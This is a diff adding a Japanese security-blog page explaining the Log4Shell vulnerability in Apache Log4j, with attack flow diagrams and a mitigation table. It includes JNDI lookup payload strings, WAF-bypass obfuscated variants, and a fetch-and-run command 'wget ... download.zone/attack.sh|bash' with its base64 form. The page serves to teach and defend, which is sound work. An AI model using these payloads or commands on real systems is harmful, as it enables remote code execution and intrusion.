@@ -1,0 +1,283 @@
+<!DOCTYPE html>
+
+<html lang="ja" data-bs-theme="auto">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="google-site-verification" content="OC87FYYbTNU7c3Q1vn3qee5kXLtXMjotpx0iGK1ZPUU" />
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta property="og:title" content="重大なサイバー攻撃の攻撃手順と対策について" />
+        <meta property="og:url" content="https://bx293apen.github.io/html/about/security/critical-cyber-attack.html" />
+        <meta property="og:image" content="https://bx293apen.github.io/img/PEN.png" />
+        <meta property="og:type" content="website" />
+        <meta property="og:site_name" content="とあるペンギンの実験室" />
+        <meta property="og:description" content="重大なサイバー攻撃の攻撃手順と対策について" />
+        <meta name="theme-color" content="#FF0000" />
+
+        <script src="/model/tips/tips.js"></script>
+        <script src="/model/index/index.js"></script>
+        <script src="/model/about/securityTips.js"></script>
+
+        <div id="styleList"></div>
+        <link href="/css/loading.css" rel="stylesheet">
+        <div class="loading-container" id="loadingScreen">
+            <div class="loading"></div>
+        </div>
+        <script src="/view/loading.js"></script>
+        <title>重大なサイバー攻撃の攻撃手順と対策について</title>
+    </head>
+    <body>
+        <div id="header-contents"></div>
+        <div class="pt-3 ps-3">
+            <main>
+                <div class="row g-5">
+                    <div class="col-md-8">
+                        <h2 class="pt-4 mt-4 border-bottom fw-bold">
+                            重大なサイバー攻撃の攻撃手順と対策について
+                        </h2>
+                        <article class="blog-post" id="article_top">
+                            <h3 class="pt-4 mt-4 border-bottom fw-bold" id="log4shell">
+                                Log4Shell (CVE-2021-44228)
+                            </h3>
+                            <h4 class="py-3 fw-bold">
+                                &emsp;&emsp;CVSS : <span id="cvss-value"></span>&emsp;EPSS : <span id="epss-value"></span>
+                            </h4>
+                            <ul>
+                                <li> Apache Log4j 2 に存在した脆弱性</li>
+                                <li> ログ出力対象の文字列に含まれる <code>${}</code> 形式の<b>Lookup構文</b>が、ログ出力時に評価・実行されてしまうことが原因</li>
+                                <li> <code>JNDI</code>(Java Naming and Directory Interface)経由で <code>LDAP</code> や <code>RMI</code> などのプロトコルを使い、外部から任意の Java クラスをロード・実行させることでリモートコード実行(RCE)に繋がる
+                                    <ul>
+                                        <li> <code>${jndi:ldap://...}</code> </li>
+                                        <li> <code>${jndi:rmi://...}</code> </li>
+                                        <li> <code>${jndi:dns://...}</code> </li>
+                                    </ul>
+                                </li>
+                                <li> 攻撃者が制御可能な文字列(HTTPヘッダ、フォーム入力など)がログ出力される箇所であれば、任意の外部サーバへ接続させることが可能</li>
+                            </ul>
+                            <h4 class="pt-4 mt-4 border-bottom fw-bold">
+                                攻撃手順
+                            </h4>
+                            <div id="md-log4shell-attack">
+| 役割 | FQDN | 説明 |
+| --- | --- | --- |
+| 脆弱なアプリケーション | `example.zone` | Log4jを使用しており、外部入力をログ出力する処理を持つ |
+| 攻撃者のLDAPサーバ | `ldap.zone` | JNDI問い合わせを受け、Referenceオブジェクト(codebase URL)を返す |
+| 攻撃者のHTTP/Classサーバ | `download.zone` | LDAPのReferenceが指すJavaクラスファイルを配布する |
+
+                            </div>
+<!--
+sequenceDiagram
+    %%{
+        init: {
+            'theme':'base',
+            'themeVariables': { 
+                'fontSize': '32px',
+                'fontFamily' : 'HGPGothicE, trebuchet ms, verdana, arial',
+                'primaryColor': '#EEE',
+                'primaryTextColor': '#000000',
+                'primaryBorderColor': '#000000',
+                'lineColor': '#000000',
+                'secondaryColor': '#EEE'
+            }
+        }
+    }%%
+    participant Attacker as 攻撃者
+    participant App as 脆弱なアプリケーション<br/>FQDN: example.zone<br/>(Log4j使用)
+    participant LDAP as 攻撃者のLDAPサーバ<br/>FQDN: ldap.zone
+    participant HTTP as 攻撃者のHTTP/Classサーバ<br/>FQDN: download.zone
+
+    Attacker->>App: 攻撃文字列(${jndi:ldap://ldap.zone/[検索キー]})を送信
+    App->>App: 受信した文字列をログ出力処理に渡す
+    App->>App: Log4jがログ文字列中の<br/>Lookup構文(${jndi:ldap://ldap.zone/[検索キー]})を検出・評価
+    App->>LDAP: example.zone から ldap.zone へ<br/>JNDI経由で問い合わせ
+    LDAP-- >>App: Referenceオブジェクトとして<br/>codebase=http://download.zone/ と<br/>クラス名を返却
+    App->>HTTP: example.zone から download.zone へ<br/>該当クラスファイルを取得(HTTP GET)
+    HTTP-- >>App: 悪意のあるJavaクラス(.class)を返却
+    App->>App: クラスをロード・インスタンス化<br/>(static初期化子やコンストラクタ内の<br/>任意コードが実行される)
+             
+-->
+                            <img src="/img/about/log4shell.svg" width = "100%"/>
+                            <p>
+                                ※<code>[検索キー]</code>は攻撃者が用意したLDAPサーバの仕様による
+                            </p>
+                            <h5 class="pt-4 mt-4 border-bottom fw-bold">
+                                LDAPサーバがBASE64などでエンコードされたOSコマンドを実行できる場合
+                            </h5>
+
+<!--
+sequenceDiagram
+    %%{
+        init: {
+            'theme':'base',
+            'themeVariables': { 
+                'fontSize': '32px',
+                'fontFamily' : 'HGPGothicE, trebuchet ms, verdana, arial',
+                'primaryColor': '#EEE',
+                'primaryTextColor': '#000000',
+                'primaryBorderColor': '#000000',
+                'lineColor': '#000000',
+                'secondaryColor': '#EEE'
+            }
+        }
+    }%%
+    participant Attacker as 攻撃者
+    participant App as 脆弱なアプリケーション<br/>FQDN: example.zone<br/>(Log4j使用)
+    participant LDAP as 攻撃者のLDAPサーバ<br/>FQDN: ldap.zone
+    participant HTTP as 攻撃者のHTTP/Classサーバ<br/>FQDN: download.zone
+    participant Shell as example.zone上のシェル<br/>(アプリ実行ユーザー権限)
+
+    Attacker->>App: 攻撃文字列を送信<br/>${jndi:ldap://ldap.zone/[BASE64でエンコードされたコマンド]}
+    App->>App: Log4jがLookup構文を評価
+    App->>LDAP: example.zone から ldap.zone へ<br/>JNDI経由で問い合わせ
+    LDAP-- >>App: Referenceオブジェクトとして<br/>codebase=http://download.zone/ と<br/>クラス名を返却
+    App->>HTTP: 該当クラスファイルを取得(HTTP GET)
+    HTTP-- >>App: 悪意のあるJavaクラス(.class)を返却<br/>(static初期化子にRuntime.exec()を実装)
+    App->>App: クラスをロード・インスタンス化<br/>static初期化子が実行される
+    App->>Shell: Runtime.exec()で以下を実行:<br/>bash -c "{echo,[BASE64でエンコードされたコマンド]}|{base64,-d}|bash"
+    Shell->>Shell: [BASE64でエンコードされたコマンド]をデコード<br/>→ 元のOSコマンドに復元
+    Shell->>HTTP: デコードされたコマンドを実行<br/>(例: wgetでattack.shを取得しパイプでbashへ)
+    HTTP-- >>Shell: attack.sh(追加の攻撃スクリプト)
+    Shell->>Shell: attack.shを実行<br/>(バックドア設置・権限昇格・<br/>ランサムウェア展開・横展開など)
+    Note over Shell: この時点でアプリ実行権限と同等の<br/>任意OSコマンド実行が可能(フルRCE)
+
+-->
+                            <img src="/img/about/log4shell-2.svg" width = "100%"/>
+                            <p>
+                                <div>
+                                    <pre><code class="language-bash">wget -q -O- http://download.zone/attack.sh|bash</code></pre>
+                                    を実行させたい場合<br><br>
+                                    シェルの特殊文字
+                                    <ul>
+                                        <li><code>|</code></li>
+                                        <li>空白</li>
+                                    </ul>
+                                    等を正常に動かすため、BASE64等でエンコードする<br>
+
+                                </div>
+                            </p>
+                            <p>
+                                <div class="fw-bold">
+                                    ターミナル
+                                </div>
+                                <pre><code class="language-bash">echo -n 'wget -q -O- http://download.zone/attack.sh|bash' | base64</code></pre>
+                            </p>
+                            <p>
+                                <div class="fw-bold">
+                                    base64
+                                </div>
+                                <pre><code class="language-bash">d2dldCAtcSAtTy0gaHR0cDovL2Rvd25sb2FkLnpvbmUvYXR0YWNrLnNofGJhc2g=</code></pre>
+                            </p>
+
+
+                            <h4 class="pt-4 mt-4 border-bottom fw-bold">
+                                難読化によるフィルタ回避(WAFバイパス)
+                            </h4>
+                            <p>
+                                <div class="fw-bold">
+                                    WAFルール回避
+                                </div>
+                                <pre><code class="language-bash">${${lower:j}ndi:ldap://ldap.zone/[検索キー]}
+${${upper:j}${lower:n}di:ldap://ldap.zone/[検索キー]}
+${${::-j}${::-n}${::-d}${::-i}:ldap://ldap.zone/[検索キー]}</code></pre>
+                            </p>
+                            <ul>
+                                <li>最終的に <code>${jndi:ldap://ldap.zone/[検索キー]}</code> と等価な文字列に解決されるため、ログ出力処理に渡った時点で元の攻撃と同じ挙動になる</li>
+                                <li>
+                                    Log4jの文字列置換処理(<code>StrSubstitutor</code>)は <code>${...}</code> を<b>内側から再帰的に評価</b>する<br>
+                                    → 様々なパターンがあるため、WAFの単純な文字列マッチだけでは不十分
+                                </li>
+                                <li>根本対策 : <b>Log4j自体の修正バージョンへの更新</b></li>
+                            </ul>
+
+
+                            <h4 class="pt-4 mt-4 border-bottom fw-bold">
+                                攻撃と対策
+                            </h4>
+                            <div id="md-log4shell">
+
+| 攻撃要件 | 成功条件 | 対策 |
+| --- | --- | --- |
+| Javaのバージョン | <ul><li>JNDIのリモートクラスロードがデフォルトで無効化される前のバージョン</li><li>`com.sun.jndi.ldap.object.trustURLCodebase` が `true` の環境</li></ul><table class="table-nostriped"><tr><th>系列</th><th>脆弱(デフォルト`true`)な範囲</th></tr><tr><td>Java 6</td><td>**6u211 より前**</td></tr><tr><td>Java 7</td><td>**7u201 より前**</td></tr><tr><td>Java 8</td><td>**8u191 より前**</td></tr><tr><td>Java 11</td><td>**11.0.1 より前**</td></tr></table> | <ul><li>JDK/JREを最新バージョンへアップデート</li><li>`trustURLCodebase` を `false` に明示的に設定</li></ul><table class="table-nostriped"><tr><th>系列</th><th>デフォルト`false`(対策済み)の範囲</th></tr><tr><td>Java 6</td><td>**6u211 以降**</td></tr><tr><td>Java 7</td><td>**7u201 以降**</td></tr><tr><td>Java 8</td><td>**8u191 以降**</td></tr><tr><td>Java 11</td><td>**11.0.1 以降**</td></tr></table> |
+| ログ出力処理 | ログ出力処理する文字列中に攻撃文字列(`${jndi:ldap://...}`等)を含める | <ul><li>Log4jを脆弱性修正済みバージョン(2.17.1以降等)へアップデート</li><li>環境変数 `LOG4J_FORMAT_MSG_NO_LOOKUPS=true` を設定</li><li>JVM引数 `-Dlog4j2.formatMsgNoLookups=true` を設定(バージョンによる)</li></ul> |
+| Log4jのライブラリ構成 | 脆弱なバージョンの `log4j-core` がクラスパス上に存在する | <ul><li>`JndiLookup` クラスをjarから削除(暫定対応)</li><li>利用中の全依存ライブラリ(SBOM)を棚卸しし、間接依存も含め脆弱バージョンを排除</li></ul> |
+| ネットワーク到達性 | アプリケーションサーバから外部(攻撃者LDAP/HTTPサーバ)への通信が許可されている | <ul><li>WAFで `${jndi:` 等のパターンを検知・遮断<br>(ただし`${${lower:j}ndi:...}`等のネスト構文で回避されうるため**根本対策にはならない**点に注意)</li><li>アプリケーションサーバからの不要な外向き通信(アウトバウンド)をファイアウォールで制限</li></ul> |
+| 入力文字列の経路 | ユーザ制御可能な入力(HTTPヘッダ、User-Agent、フォーム値等)がログに出力される | <ul><li>ログ出力前に入力値のサニタイズ・エスケープを実施</li><li>外部入力を直接ログメッセージに含めない設計にする</li></ul> |
+
+                            </div>
+                        </article>
+
+                        
+                    
+                    </div>
+                    <div class="col-md-4">
+                        <div class="position-sticky" style="top: 2rem;">
+                            <div class="p-4">
+                                <h4 class="fst-italic border-bottom">Table of Contents</h4>
+                                <ol class="list-unstyled mb-0">
+                                    <li>
+                                        <a href="#article_top">Top</a>
+                                    </li>
+                                    <li>
+                                        <a href="#log4shell">Log4Shell</a>
+                                    </li>
+                                    <li>
+                                        <a href="#pagination">ページ切り替え</a>
+                                    </li>
+                                </ol>
+                            </div>
+
+                            <div id="tips"></div>
+                        </div>
+                    </div>
+                </div>
+            
+            </main>
+        </div>
+    </body>
+    <footer class="container border-top"> <!-- FOOTER -->
+        <div id="pagination"></div>
+        <div id="footer-contents"></div>
+        <script src="/view/bootstrap.bundle.min.js"></script>
+        <script src="/view/search.js"></script>
+        <script src="/view/embeddedHTML.js"></script>
+        <script src="/view/highlight.min.js"></script>
+        <script src="/view/activenav.js"></script>
+        <script src="/view/tips/tips.js"></script>
+        <script src="/view/md.js"></script>
+        <script src="/view/pagination.js"></script>
+        <script src="/view/tex.js"></script>
+        <script src="/view/api.js"></script>
+        <script>
+            hljs.highlightAll();
+            embedded_html("/template/styleConfig.html", "styleList");
+            embedded_html("/template/header.html", "header-contents");
+            embedded_html("/template/footer.html", "footer-contents");
+            window.addEventListener("load", active_nav("about"));
+            new TipsView(tipsModel, "tips", "tips", ["cTip", "pythonTip", "serverTip", "appTip"]);
+            
+            const mdLists = [
+                "md-log4shell-attack",
+                "md-log4shell",
+            ];
+
+            window.addEventListener(
+                "load", 
+                () => {
+                    for (const mdID of mdLists) {
+                        setTimeout(
+                            () => {
+                                new MarkDownMaker(
+                                    id              = mdID,
+                                )
+                            },
+                            300
+                        )
+                    }
+                }
+            )
+
+            new Pagination(4, securityModel.page, "pagination");
+            new GetCveScore("CVE-2021-44228", "cvss-value", "epss-value");
+        </script>
+    </footer>
+    
+</html>
